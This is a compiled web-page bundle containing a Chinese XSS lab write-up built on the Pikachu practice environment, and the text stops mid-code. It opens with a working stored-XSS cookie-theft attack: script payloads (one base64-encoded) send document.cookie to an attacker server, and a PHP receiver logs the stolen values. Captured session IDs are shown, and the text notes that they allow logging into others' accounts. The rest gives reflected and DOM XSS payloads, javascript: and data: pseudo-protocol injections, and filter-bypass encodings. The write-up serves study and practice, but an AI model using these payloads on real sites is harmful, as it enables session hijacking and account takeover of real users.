"use strict";(self.webpackChunkvuepress_theme_hope_template=self.webpackChunkvuepress_theme_hope_template||[]).push([[7780],{81021:(i,s)=>{s.A=(i,s)=>{const a=i.__vccOpts||i;for(const[i,e]of s)a[i]=e;return a}},40910:(i,s,a)=>{a.r(s),a.d(s,{comp:()=>E,data:()=>f});var e=a(6254);const t=a.p+"assets/img/3165839-20230505102219883-856345275-20240912175627-uhcytdn.396d7e46.png",l=a.p+"assets/img/image-20240912184253-mku50di.fc4564c2.png",n=a.p+"assets/img/image-20240912184050-4fpzsa7.f347e8bd.png",h=a.p+"assets/img/image-20240912185609-5b80133.dc4488aa.png",p=a.p+"assets/img/image-20240912192955-e06i7gz.c0a838f7.png",k=a.p+"assets/img/image-20240912110401-qiydvi1.3cdb6dd8.png",r=a.p+"assets/img/image-20240912111045-ekroy5i.8affec23.png",d=a.p+"assets/img/image-20240912111230-ipgwihp.43fbeec3.png",g=a.p+"assets/img/image-20240912193453-3rhk3hg.7d182c43.png",c=a.p+"assets/img/image-20240912193701-lmupydt.82169990.png",o=a.p+"assets/img/image-20240912194128-g63ajgw.d7c6995c.png",A=a.p+"assets/img/image-20240912194240-5ct8t09.6c0e89fa.png",y=a.p+"assets/img/image-20240912201458-9grruqf.5b04d25c.png",m=a.p+"assets/img/image-20240912203748-rfhdlud.f060c45d.png",b=a.p+"assets/img/image-20240912204327-v1pdh4b.236558b9.png",u=a.p+"assets/img/image-20240912205109-nclcm5j.c15b2f49.png",F=a.p+"assets/img/image-20240912204839-hjs0e4k.e344f513.png",v=a.p+"assets/img/image-20240912231718-5fx1one.d32748de.png",B=a.p+"assets/img/image-20240912231952-sqksar5.66b85fc1.png",C={},E=(0,a(81021).A)(C,[["render",function(i,s){return(0,e.uX)(),(0,e.CE)("div",null,s[0]||(s[0]=[(0,e.Fv)('<h1 id="xss实验" tabindex="-1"><a class="header-anchor" href="#xss实验"><span>XSS实验</span></a></h1><h2 id="通过存储型xss获取被攻击者的cookie" tabindex="-1"><a class="header-anchor" href="#通过存储型xss获取被攻击者的cookie"><span>通过存储型XSS获取被攻击者的cookie</span></a></h2><ol><li><p>首先，搞清楚原理，cookie在哪里？要发到那里？利用什么发？​<img src="'+t+'" alt="3165839-20230505102219883-856345275" loading="lazy">​</p></li><li><p>在web server 端构造如下payload</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">payload1（不进行编码）：</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;script&gt;document.write(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;&lt;img src=&quot;http://47.113.187.x:91/cookie.php?cookie=&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">+document.cookie+</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;&quot; width=0 height=0 border=0 /&gt;&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);&lt;/script&gt;</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">payload2（base64编码）：</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;script&gt;document.write(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;&lt;img src=&quot;http://192.168.43.18/xssGetCookie/getcookie.php?cookie=&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">+window.btoa(unescape(encodeURIComponent(escape(document.cookie))))+</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;&quot;&gt;&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);&lt;/script&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>payload提交后<span data-type="text" style="color:var(--b3-font-color9);">javascript脚本操纵DOM对象写入img标签</span>，并且标签的url中拼接了用户的cookie值，当浏览器渲染页面时就会<span data-type="text" style="color:var(--b3-font-color9);">GET形式</span>请求图片资源，并将<span data-type="text" style="color:var(--b3-font-color9);">cookie值</span>携带到攻击者服务器。</p><p>​<img src="'+l+'" alt="image" loading="lazy">​</p></li><li><p>在攻击者服务器需要提供和payload路径对应的url给请求端访问，攻击者服务器获取GET中的cookie存储到文本文件中。</p><div class="language-top line-numbers-mode" data-highlighter="shiki" data-ext="top" data-title="top" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&lt;?php //攻击端，用于接收被攻击端请求的信息</span></span>\n<span class="line"><span>$cookie = $_GET[&#39;cookie&#39;]; //获取cookie信息</span></span>\n<span class="line"><span>$log =  fopen(&#39;cookie.txt&#39;,&#39;a&#39;); //生成获取的cookie信息，打开文件，a是追加写模式</span></span>\n<span class="line"><span>fwrite($log,$cookie.PHP_EOL); //fwrite写入</span></span>\n<span class="line"><span>fclose($log);</span></span>\n<span class="line"><span>?&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>查看文本文件，两个payload所请求的cookie。​</p><p><img src="'+n+'" alt="image" loading="lazy">​</p><p>经过编码的cookie经过base64和URL解码如下</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">ichunqiu</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">PHPSESSID</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">1iadqpfqbcrjqjfamfdmjchn2t</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">_ga_P1JF3QTQ79</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">GS1.1.1726128058.2.0.1726128058.0.0.0</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li><li><p>当其他用户访问该网页</p><p>攻击者端生成如下cookie</p><p>​<img src="'+h+'" alt="image" loading="lazy">​</p></li><li><p>编码的cookie经过base64和URL解码如下</p><p>PHPSESSID=8mf3m5s9h457dlnqfjdmdi5st8</p></li><li><p>利用该cookie可以通过工具实现不用账号密码登录他人账户。</p></li></ol><h2 id="pikachu的xss实验" tabindex="-1"><a class="header-anchor" href="#pikachu的xss实验"><span>Pikachu的XSS实验</span></a></h2><h3 id="存储型" tabindex="-1"><a class="header-anchor" href="#存储型"><span>存储型</span></a></h3><p>在页面输出cookie即操作DOM获取cookie并展示到页面。</p><p>payload：</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &lt;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">document.write</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&#39;&lt;p&gt;&#39;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">+document.cookie+</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&#39;&lt;/p&gt;&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);&lt;script&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>注意：document.write中需要是输出字符和变量的拼接。</p><p>​<img src="'+p+'" alt="image" loading="lazy">​</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/p&gt;&lt;img </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">src</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;https://www.hacked.com.cn/images/logo.gif&quot;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> border</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;0&quot;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">  onmouseover</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;javascript:alert(&#39;广告位招租&#39;)&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">p</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>​<img src="'+k+'" alt="image" loading="lazy">​</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/p&gt;&lt;img </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">src</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;https://www.hacked.com.cn/images/logo.gif&quot;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> border</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;0&quot;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">  onclick</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;javascript:alert(&#39;广告位招租&#39;)&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">p</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>​<img src="'+r+'" alt="image" loading="lazy">​</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/p&gt;&lt;a </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">href</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;https://nav3.cn/side?page=6&amp;id=0&amp;_=1726107142616&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">点我导航</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/a</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">p</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>​<img src="'+d+'" alt="image" loading="lazy">​</p><h3 id="反射型-get" tabindex="-1"><a class="header-anchor" href="#反射型-get"><span>反射型(GET)</span></a></h3><p>直接输入<code>&lt;/p&gt;</code>标签被闭合</p><p>​<img src="'+g+'" alt="image" loading="lazy">​</p><p>payload：</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/p&gt;&lt;script&gt;document.write(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&#39;&lt;p&gt;&#39;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">+document.cookie+</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&#39;&lt;/p&gt;&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);&lt;/script&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>​<img src="'+c+'" alt="image" loading="lazy">​</p><h3 id="反射型-post" tabindex="-1"><a class="header-anchor" href="#反射型-post"><span>反射型(POST)</span></a></h3><p>登录</p><p>​<img src="'+o+'" alt="image" loading="lazy">​</p><p>登录发现套路一样</p><p>payload：</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/p&gt;&lt;script&gt;document.write(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&#39;&lt;p&gt;&#39;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">+document.cookie+</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&#39;&lt;/p&gt;&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);&lt;/script&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>​<img src="'+A+'" alt="image" loading="lazy">​</p><h3 id="dom型xss" tabindex="-1"><a class="header-anchor" href="#dom型xss"><span>DOM型xss</span></a></h3><p>输入111，发现被放到a的href里</p><p>​<img src="'+y+'" alt="image" loading="lazy">​</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#&#39; onclick=&quot;alert(document.cookie)&quot;&gt;   闭合href标签，并且在中添加a有的点击事件。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>​<img src="'+m+'" alt="image" loading="lazy">​</p><h3 id="dom型xss-x" tabindex="-1"><a class="header-anchor" href="#dom型xss-x"><span>DOM型xss-x</span></a></h3><p>输入内容，发现拼接在URL</p><p>​<img src="'+b+'" alt="image" loading="lazy">​</p><p>在a的href里拼接，使其闭合。</p><p>​<img src="'+u+'" alt="image" loading="lazy">​</p><p>使用’闭合href，加入onclick事件获取cookie</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&#39; onclick=&quot;alert(document.cookie)&quot;&#39;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>​<img src="'+F+'" alt="image" loading="lazy">​</p><h3 id="xss之href输出" tabindex="-1"><a class="header-anchor" href="#xss之href输出"><span>xss之href输出</span></a></h3><p>​<img src="'+v+'" alt="image" loading="lazy">​</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">W3School中对</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;a&gt;标签的href属性有以下描述（引用摘自HTML &lt;a&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">标签的</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> href</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 属性）：</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;a&gt; 标签的 href 属性用于指定超链接目标的 URL。</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">href</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 属性的值可以是任何有效文档的相对或绝对</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> URL，包括</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">span</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> data-type=&quot;text&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> style=&quot;color: var(--b3-font-color9);&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">片段标识符</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/spa</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">n&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">和</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">span</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> data-type=&quot;text&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> style=&quot;color: var(--b3-font-color9);&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">JavaScript</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 代码段</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/spa</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">n&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">。如果用户选择了</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &lt;a&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">标签中的内容，那么浏览器会尝试检索并显示</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> href</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 属性指定的</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> URL</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 所表示的文档，或者执行</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">span</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> data-type=&quot;text&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> style=&quot;color: var(--b3-font-color9);&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">JavaScript</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 表达式</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/spa</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">n&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">、</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">span</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> data-type=&quot;text&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> style=&quot;color: var(--b3-font-color9);&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">方法和函数的列表</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/spa</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">n&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>payload：</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">javascript:alert(document.cookie</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>​<img src="'+B+'" alt="image" loading="lazy">​</p><h2 id="xss与标签" tabindex="-1"><a class="header-anchor" href="#xss与标签"><span>XSS与标签</span></a></h2><h3 id="伪协议" tabindex="-1"><a class="header-anchor" href="#伪协议"><span>伪协议</span></a></h3><h4 id="data" tabindex="-1"><a class="header-anchor" href="#data"><span>data:</span></a></h4><p>payload：</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;iframe src</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;data:text/html,&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot; &gt;&lt;iframe&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h4 id="javascript" tabindex="-1"><a class="header-anchor" href="#javascript"><span>javascript:</span></a></h4><p>payload：</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">javascript:alert(document.cookie</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)  (</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">可用在href里</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="xss变形" tabindex="-1"><a class="header-anchor" href="#xss变形"><span>XSS变形</span></a></h2><p>实验环境pikachu XSS</p><ol><li><p>大小写</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;SCRipt&gt;alert(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)&lt;/scRiPt&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li><li><p>引号‘“</p></li><li><p>空格过滤/绕过</p></li><li><p>回车绕过</p><div class="language-javascript line-numbers-mode" data-highlighter="shiki" data-ext="javascript" data-title="javascript" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">a</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic;"> href</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;j</span></span>\n<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">a</span></span>\n<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">v</span></span>\n<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">ascript:alert(&#39;XSS&#39;)&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;回车可用&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">a</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>事件无法使用</p></li><li><p>编码绕过</p><p>java==&gt;html 16进制<code>&amp;#x006a;&amp;#x0061;&amp;#x0076;&amp;#x0061;</code>​</p><p>script==&gt;html 10进制 <code>&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;</code>​</p><div class="language-javascript line-numbers-mode" data-highlighter="shiki" data-ext="javascript" data-title="javascript" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">a</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic;"> href</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#E06C75;">&amp;</span><span style="--shiki-light:#986801;--shiki-dark:#E06C75;">#x006a</span><span style="--shiki-light:#50A14F;--shiki-dark:#E06C75;">;&amp;</span><span style="--shiki-light:#986801;--shiki-dark:#E06C75;">#x0061</span><span style="--shiki-light:#50A14F;--shiki-dark:#E06C75;">;&amp;</span><span style="--shiki-light:#986801;--shiki-dark:#E06C75;">#x0076</span><span style="--shiki-light:#50A14F;--shiki-dark:#E06C75;">;&amp;</span><span style="--shiki-light:#986801;--shiki-dark:#E06C75;">#x0061</span><span style="--shiki-light:#50A14F;--shiki-dark:#E06C75;">;&amp;</span><span style="--shiki-light:#986801;--shiki-dark:#E06C75;">#115</span><span style="--shiki-light:#50A14F;--shiki-dark:#E06C75;">;&amp;</span><span 